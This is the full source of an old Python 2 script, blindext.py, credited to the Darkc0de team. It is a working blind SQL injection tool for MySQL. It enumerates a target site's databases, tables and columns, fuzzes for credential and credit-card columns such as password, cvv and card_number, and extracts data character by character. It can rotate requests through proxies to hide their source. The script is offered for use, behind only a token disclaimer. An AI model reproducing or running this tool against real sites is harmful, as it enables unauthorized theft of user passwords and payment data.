#!/usr/bin/python
# Features!
# 1.MySQL Blind Injection Data Extractor 
# 2.MySQL Blind Information_schema Database Enumerator
# 3.MySQL Blind Table and Column Fuzzer 

# Feel free to do whatever you want with this code!
# Share the c0de!

# Darkc0de Team 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, P47r1ck, Tarsian, c0mr@d, reverenddigitalx
# and the rest of the Darkc0de members

# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# Intended for authorized Web Application Pen Testing!

# BE WARNED, THIS TOOL IS VERY LOUD..

# Change Log
# 2.9 - added info mode, bug fix in the GuessValue function
# 3.0 - added row option.. now you can tell the app where to begin - remember limit start at 0 not 1

#Fill in the tables you want tested here.
fuzz_tables = ["user","users","username","usernames","mysql.user","orders","order_items","member","members","admin","administrator","administrators","login","logins","logon","jos_users","jos_contact_details","userrights","account","superuser","control","usercontrol","author","autore","artikel","newsletter","tb_user","tb_users","tb_username","tb_usernames","tb_admin","tb_administrator","tb_member","tb_members","tb_login","perdorues","korisnici","webadmin","webadmins","webuser","webusers","webmaster","webmasters","customer","customers","sysuser","sysusers","sysadmin","sysadmins","memberlist","tbluser","tbl_user","tbl_users","a_admin","x_admin","m_admin","adminuser","admin_user","adm","userinfo","user_info","admin_userinfo","userlist","user_list","user_admin","order","user_login","admin_user","admin_login","login_user","login_users","login_admin","login_admins","sitelogin","site_login","sitelogins","site_logins","SiteLogin","Site_Login","User","Users","Admin","Admins","Login","Logins","adminrights","news","perdoruesit"] 
#Fill in the columns you want tested here.
fuzz_columns = ["user","username","password","passwd","pass","id","email","emri","fjalekalimi","pwd","user_name","customers_email_address","customers_password","user_password","name","user_pass","admin_user","admin_password","admin_pass","usern","user_n","users","login","logins","login_user","login_admin","login_username","user_username","user_login","auid","apwd","adminid","admin_id","adminuser","admin_user","adminuserid","admin_userid","adminusername","admin_username","adminname","admin_name","usr","usr_n","usrname","usr_name","usrpass","usr_pass","usrnam","nc","uid","userid","user_id","myusername","mail","emni","logohu","punonjes","kpro_user","wp_users","emniplote","perdoruesi","perdorimi","punetoret","logini","llogaria","fjalekalimin","kodi","emer","ime","korisnik","korisnici","user1","administrator","administrator_name","mem_login","login_password","login_pass","login_passwd","login_pwd","sifra","lozinka","psw","pass1word","pass_word","passw","pass_w","user_passwd","userpass","userpassword","userpwd","user_pwd","useradmin","user_admin","mypassword","passwrd","admin_pwd","admin_pass","admin_passwd","mem_password","memlogin","admin_id","adminid","e_mail","usrn","u_name","uname","mempassword","mem_pass","mem_passwd","mem_pwd","p_word","pword","p_assword","myusername","myname","my_username","my_name","my_password","my_email","cvvnumber","order_payment","card_number","is_admin","cc_number","ccnum","cc_num","credit_card_number","cvc_code","billing_first_name","cvv","cvv2","firstname","lastname","fname","lname","first","last"] 
  

import urllib, sys, re, os, socket, httplib, urllib2, time

#the guts and glory - Binary Algorithim that does all the guessing
def GuessValue(URL):
        global gets
        global proxy_num
        lower = lower_bound
        upper = upper_bound
        while lower < upper:
                try:
                        mid = (lower + upper) / 2
                        head_URL = URL + ">"+str(mid)
                        #print head_URL
                        gets+=1
                        proxy_num+=1
                        source = proxy_list[proxy_num % proxy_len].open(head_URL).read()
                        match = re.findall(string,source)
                        if len(match) >= 1:
                                lower = mid + 1
                        else:
                                upper = mid                    
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass

        if lower > lower_bound and lower < upper_bound:
                value = lower
        else:
                head_URL = URL + "="+str(lower)
                gets+=1
                proxy_num+=1
                source = proxy_list[proxy_num % proxy_len].open(head_URL).read()
                match = re.findall(string,source)
                if len(match) >= 1:
                        value = lower
                else:
                        value = 63
                        print "Could not find the ascii character! There must be a problem.."
                        print "Check to make sure your using the app right!"
                        print "READ xprog's blind sql tutorial!\n"
                        sys.exit(1)
        return value

#determine platform
if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

#say hello
os.system(SysCls)
if len(sys.argv) <= 1:
        print "\n|---------------------------------------------------------------|"
        print "| rsauron[@]gmail[dot]com                                 v3.0  |"
        print "|   7/2008      blindext.py                                     |"
        print "|      -Blind MySQL v5+ Information_schema Database Enumeration |"
        print "|      -Blind MySQL v4+ Data Extractor                          |"
        print "|      -Blind MySQL v4+ Table & Column Fuzzer                   |"
        print "| Usage: blindext.py [options]                                  |"
        print "|                    -h help                    darkc0de.com    |"
        print "|---------------------------------------------------------------|\n"
        sys.exit(1)

#define varablies
site = ""
string = ""
dbt = "blindextlog.txt"
proxy = "None"
count = 0
mode = "None"
arg_table = "None"
arg_database = "None"
arg_columns = "None"
arg_dump = "None"
arg_schema = "None"
arg_dbs = "None"
arg_mysqldb = ""
darkc0de = ""
line_URL = ""
lower_bound = 0
upper_bound = 10000
gets = 0
mid =0
let_pos = 1
lim_num = 0
value = ""

#help option
for arg in sys.argv:
        if arg == "-h":
                print "\n   Usage: ./blindext.py [options]        rsauron[@]gmail[dot]com darkc0de.com"
                print "\tModes:"
                print "\tDefine: --schema Enumerate Information_schema Database."
                print "\tDefine: --dump   Extract information from a Database, Table and Column."
                print "\tDefine: --dbs    Shows all databases user has access too."
                print "\tDefine: --fuzz   Fuzz Tables and Columns."
                print "\tDefine: --info   Prints server version, username@location, database name."
                print "\n\tRequired:"
                print "\tDefine: -u       \"www.site.com/news.php?id=234\""
                print "\tDefine: -s       \"truetextinpage\""
                print "\n\tModes dump and schema options:"
                print "\tDefine: -D       \"database_name\""
                print "\tDefine: -T       \"table_name\""
                print "\tDefine: -C       \"column_name,column_name...\""
                print "\n\tOptional:"
                print "\tDefine: -r       row to begin extracting info at."
                print "\tDefine: -p       \"127.0.0.1:80 or proxy.txt\""
                print "\tDefine: -o       \"ouput_file_name.txt\"          Default:blindextlog.txt"
                print "\n   Ex: ./blindext.py --dbs -u \"www.site.com/news.php?id=234\" -s \"textinpage\" -o output.txt"
                print "   Ex: ./blindext.py --fuzz -u \"www.site.com/news.php?id=234\" -s \"textinpage\" -p 127.0.0.1:8080"
                print "   Ex: ./blindext.py --schema -u \"www.site.com/news.php?id=234\" -s \"textinpage\" -D catalog" 
                print "   Ex: ./blindext.py --schema -u \"www.site.com/news.php?id=234\" -s \"textinpage\" -D catalog -T orders -p proxy.txt"
                print "   Ex: ./blindext.py --dump -u \"www.site.com/news.php?id=234\" -s \"textinpage\" -D newjoom -T jos_users -C username,password"
                sys.exit(1)

#Check args
for arg in sys.argv:
	if arg == "-u":
		site = sys.argv[count+1]
	elif arg == "-s":
                string = sys.argv[count+1]
	elif arg == "-o":
		dbt = sys.argv[count+1]
	elif arg == "-p":
		proxy = sys.argv[count+1]
	elif arg == "--dump":
                mode = arg
                arg_dump = sys.argv[count]
        elif arg == "--schema":
                mode = arg
                arg_schema = sys.argv[count]
        elif arg == "--dbs":
                mode = arg
                arg_dbs = sys.argv[count]
        elif arg == "--fuzz":
                mode = arg
                arg_fuzz = sys.argv[count]
        elif arg == "--info":
                mode = arg
                arg_info = sys.argv[count]
	elif arg == "-D":
		arg_database = sys.argv[count+1]
	elif arg == "-T":
		arg_table = sys.argv[count+1]
	elif arg == "-C":
		arg_columns = sys.argv[count+1]
	elif arg == "-r":
                lim_num = sys.argv[count+1]
	count+=1

#Title write
file = open(dbt, "a")
print "\n|---------------------------------------------------------------|"
print "| rsauron[@]gmail[dot]com                                 v3.0  |"
print "|   7/2008      blindext.py                                     |"
print "|      -Blind MySQL v5+ Information_schema Database Enumeration |"
print "|      -Blind MySQL v4+ Data Extractor                          |"
print "|      -Blind MySQL v4+ Table & Column Fuzzer                   |"
print "| Usage: blindext.py [options]                                  |"
print "|                    -h help                    darkc0de.com    |"
print "|---------------------------------------------------------------|"
file.write("\n\n|---------------------------------------------------------------|")
file.write("\n| rsauron[@]gmail[dot]com                                 v3.0  |")
file.write("\n|   7/2008      blindext.py                                     |")
file.write("\n|      -Blind MySQL v5+ Information_schema Database Enumeration |")
file.write("\n|      -Blind MySQL v4+ Data Extractor                          |")
file.write("\n|      -Blind MySQL v4+ Table & Column Fuzzer                   |")
file.write("\n| Usage: blindext.py [options]                                  |")
file.write("\n|                    -h help                    darkc0de.com    |")
file.write("\n|---------------------------------------------------------------|")
	
#Arg Error Checking
if site == "":
        print "\n[-] Must include -u flag and -s flag."
        print "[-] For help -h\n"
        sys.exit(1)
if string == "":
        print "\n[-] Must include -s flag followed by \"truetextinpage\" string."
        print "[-] For help -h\n"
        sys.exit(1)
if mode == "None":
        print "\n[-] Mode must be specified --schema --dbs --dump --fuzz"
        print "[-] For help -h\n"
        sys.exit(1)
if mode == "--schema" and arg_database == "None":
        print "[-] Must include -D flag!"
        print "[-] For Help -h\n"
        sys.exit(1)
if mode == "--dump":
        if arg_table == "None" or arg_columns == "None":
                print "[-] If MySQL v5+ must include -D, -T and -C flag when --dump specified!"
                print "[-] If MySQL v4+ must include -T and -C flag when --dump specified!"
                print "[-] For help -h\n"
                sys.exit(1)
if proxy != "None":
        if len(proxy.split(".")) == 2:
                proxy = open(proxy, "r").read()
        if proxy.endswith("\n"):
                proxy = proxy.rstrip("\n")
        proxy = proxy.split("\n")
if arg_columns != "None":
        arg_columns = arg_columns.split(",")
if site[:7] != "http://": 
	site = "http://"+site

#Build proxy list
print "\n[+] URL:",site
file.write("\n\n[+] URL:"+site+"\n")
socket.setdefaulttimeout(10)
proxy_list = []
if proxy != "None":
        
        file.write("[+] Building Proxy List...")
        print "[+] Building Proxy List..."
        for p in proxy:
                try:
                    proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
                    opener = urllib2.build_opener(proxy_handler)
                    opener.open("http://www.google.com")
                    proxy_list.append(urllib2.build_opener(proxy_handler))
                    file.write("\n\tProxy:"+p+"- Success")
                    print "\tProxy:",p,"- Success"
                except:
                    file.write("\n\tProxy:"+p+"- Failed")
                    print "\tProxy:",p,"- Failed"
                    pass
        if len(proxy_list) == 0:
                print "[-] All proxies have failed. App Exiting"
                file.write("\n[-] All proxies have failed. App Exiting\n")
                sys.exit(1) 
        print "[+] Proxy List Complete"
        file.write("[+] Proxy List Complete")
else:
    print "[-] Proxy Not Given"
    file.write("[+] Proxy Not Given")
    proxy_list.append(urllib2.build_opener())

#Gather Server Config
print "[+] Gathering MySQL Server Configuration..."
file.write("\n[+] Gathering MySQL Server Configuration...")
proxy_num = 0
proxy_len = len(proxy_list)
ser_ver = 3
while 1:
        try:
                config_URL = site+"+and+substring(@@version,1,1)="+str(ser_ver)
                proxy_num+=1
                source = proxy_list[proxy_num % proxy_len].open(config_URL).read()
                match = re.findall(string,source)
                if len(match) >= 1:
                        print "\t[+] MySQL >= v"+str(ser_ver)+".0.0 found!"
                        file.write("\n\t[+] MySQL >= v"+str(ser_ver)+".0.0 found!")
                        if int(ser_ver) <= 4 and mode == "--schema":
                                print "\t[-] Schema & dbs mode only works on MySQL v5+!!"
                                file.write("\n\t[-] Schema & dbs mode only work on MySQL v5+!!")
                                print "[-] Done"
                                file.write("[-] Done")
                                sys.exit(1)
                        if int(ser_ver) <= 4 and mode == "--dbs":
                                print "\t[-] Schema & dbs mode only works on MySQL v5+!!"
                                file.write("\n\t[-] Schema & dbs mode only work on MySQL v5+!!")
                                print "[-] Done"
                                file.write("[-] Done")
                                sys.exit(1)
                        break
                if int(ser_ver) >= 6:
                        print "\t[-] Not a MySQL server or the string your using is not being found!"
                        file.write("\n\t[-] Not a MySQL server or the string your using is not being found!")
                        print "[-] Done"
                        file.write("[-] Done")
                        sys.exit(1)
                ser_ver+=1
                gets+=1
        except (KeyboardInterrupt, SystemExit):
        	raise
	except:
                pass
        
#Build URLS
if mode == "--schema":
	if arg_database != "None" and arg_table == "None":
                print "[+] Showing Tables from database \""+arg_database+"\""
                file.write("\n[+] Showing Tables from database \""+arg_database+"\"")
                count_URL = site+"+and+((SELECT+COUNT(table_name)"
                count_URL += "+FROM+information_schema.TABLES+WHERE+table_schema+=+0x"+arg_database.encode("hex")+"))"
                line_URL = site+"+and+ascii(substring((SELECT+table_name"
                line_URL += "+FROM+information_schema.TABLES+WHERE+table_schema+=+0x"+arg_database.encode("hex")
        if arg_database != "None" and arg_table != "None":
                print "[+] Showing Columns from database \""+arg_database+"\" and Table \""+arg_table+"\""
                file.write("\n[+] Showing Columns from database \""+arg_database+"\" and Table \""+arg_table+"\"")
                count_URL = site+"+and+((SELECT+COUNT(column_name)"
                count_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema+=+0x"+arg_database.encode("hex")
                count_URL += "+AND+table_name+=+0x"+arg_table.encode("hex")+"))"
                line_URL = site+"+and+ascii(substring((SELECT+column_name"
                line_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema+=+0x"+arg_database.encode("hex")
                line_URL += "+AND+table_name+=+0x"+arg_table.encode("hex")
elif mode == "--dump":                
	print "[+] Dumping data from database \""+str(arg_database)+"\" Table \""+str(arg_table)+"\""
	print "[+] and Column(s) "+str(arg_columns)
	file.write("\n[+] Dumping data from database \""+str(arg_database)+"\" Table \""+str(arg_table)+"\"")
        file.write("\n[+] Column(s) "+str(arg_columns))
        for column in arg_columns:
                darkc0de += column+",0x3a,"
        darkc0de = darkc0de.rstrip("0x3a,")
        count_URL = site+"+and+((SELECT+COUNT(*)+FROM+"
        count_URL = count_URL+""+arg_database+"."+arg_table+"))"        
        line_URL = site+"+and+ascii(substring((SELECT+concat("+darkc0de+")+FROM+"
        line_URL = line_URL+""+arg_database+"."+arg_table
        if ser_ver == 4:
                count_URL = site+"+and+((SELECT+COUNT(*)+FROM+"+arg_table+"))"
                line_URL = site+"+and+ascii(substring((SELECT+concat("+darkc0de+")+FROM+"+arg_table
                if arg_database == "mysql" or arg_database == "MYSQL" or arg_database == "MySQL":
                        count_URL = site+"+and+((SELECT+COUNT(*)+FROM+mysql."+arg_table+"))"
                        line_URL = site+"+and+ascii(substring((SELECT+concat("+darkc0de+")+FROM+mysql."+arg_table
elif mode == "--dbs":
	print "[+] Showing all databases current user has access too!"
	file.write("\n[+] Showing all databases current user has access too!")
        count_URL = site+"+and+((SELECT+COUNT(schema_name)"
        count_URL += "+FROM+information_schema.schemata+where+schema_name+!=+0x"+"information_schema".encode("hex")+"))"
	line_URL = site+"+and+ascii(substring((SELECT+schema_name"
	line_URL += "+from+information_schema.schemata+where+schema_name+!=+0x"+"information_schema".encode("hex")
line_URL += "+LIMIT+"

if mode == "--info":
        print "[+] Showing database version, username@location, and database name!"
	file.write("\n[+] Showing database version, username@location, and database name!")
	count_URL = "Nothing"
	line_URL = site+"+and+ascii(substring((SELECT+concat(version(),0x3a,user(),0x3a,database())),"


#Lets Fuzz
if mode == "--fuzz":
        print "\n[%s] StartTime" % time.strftime("%X")
        file.write("\n\n[%s] StartTime" % time.strftime("%X"))
        print "[+] Fuzzing Tables..."
        file.write("\n[+] Fuzzing Tables...")
        fuzz_TABLE_url = site+"+and+(SELECT+1+from+TABLE+limit+0,1)=1"
        for table in fuzz_tables: 
                try:
                        proxy_num+=1
                        gets+=1
                        table_URL = fuzz_TABLE_url.replace("TABLE",table)
                        source = proxy_list[proxy_num % proxy_len].open(table_URL).read()
                        match = re.findall(string,source)
                        if len(match) >= 1:
                                print "\n[Table]:",table
                                file.write("\n\n[Table]:"+table)
                                fuzz_COLUMN_url = site+"+and+(SELECT+substring(concat(1,COLUMN),1,1)+from+"+table+"+limit+0,1)=1"
                                for column in fuzz_columns:
                                        try:
                                                proxy_num+=1
                                                gets+=1
                                                column_URL = fuzz_COLUMN_url.replace("COLUMN",column)
                                                source = proxy_list[proxy_num % proxy_len].open(column_URL).read()
                                                match = re.findall(string,source)
                                                if len(match) >= 1:
                                                        print "[Column]:",column
                                                        file.write("\n[Column]:"+column)	
                                        except (KeyboardInterrupt, SystemExit):
                                                raise
                                        except:
                                                pass	
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass
        print "\n[%s] EndTime" % time.strftime("%X")
        print "[-] Total URL Requests",gets
        file.write("\n\n[%s] EndTime" % time.strftime("%X"))
        file.write("\n[-] Total URL Requests "+str(gets))
        print "[-] Done\n"
        file.write("\n[-] Done\n")
        print "Don't forget to check", dbt,"\n"
        file.close()
        sys.exit(1)

#lets count how many rows before we begin
print "[+] %s" % time.strftime("%X")
file.write("\n[+] %s" % time.strftime("%X"))
if mode != "--info":
        row_value = GuessValue(count_URL)
        print "[+] Number of Rows: ",row_value,"\n"
        file.write("\n[+] Number of Rows: "+str(row_value)+"\n")
else:
        row_value = 1
#print line_URL
#print Count_URL
        
#Primary Loop
lower_bound = 0
upper_bound = 127
for data_row in range(int(lim_num), row_value):
        sys.stdout.write("[%s]: " % (lim_num))
        file.write("\n[%s]: " % (lim_num))
        sys.stdout.flush()
        value = chr(upper_bound)
        while value != chr(0):
                try:
                        if mode != "--info":
                                Guess_URL = line_URL + str(lim_num) +",1),"+str(let_pos)+",1))"
                                #print Guess_URL
                                value = chr(GuessValue(Guess_URL))
                                sys.stdout.write("%s" % (value))
                                file.write(value)
                                sys.stdout.flush()
                                let_pos+=1
                        else:
                                Guess_URL = line_URL + str(let_pos)+",1))"
                                #print Guess_URL
                                value = chr(GuessValue(Guess_URL))
                                sys.stdout.write("%s" % (value))
                                file.write(value)
                                sys.stdout.flush()
                                let_pos+=1
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass
        print
        lim_num = int(lim_num) + 1
        let_pos = 1
        data_row+=1

#Lets wrap it up!
print "\n[-] %s" % time.strftime("%X")
print "[-] Total URL Requests",gets
file.write("\n\n[-] %s" % time.strftime("%X"))
file.write("\n[-] Total URL Requests "+str(gets))
print "[-] Done\n"
file.write("\n[-] Done\n")
print "Don't forget to check", dbt,"\n"
file.close()
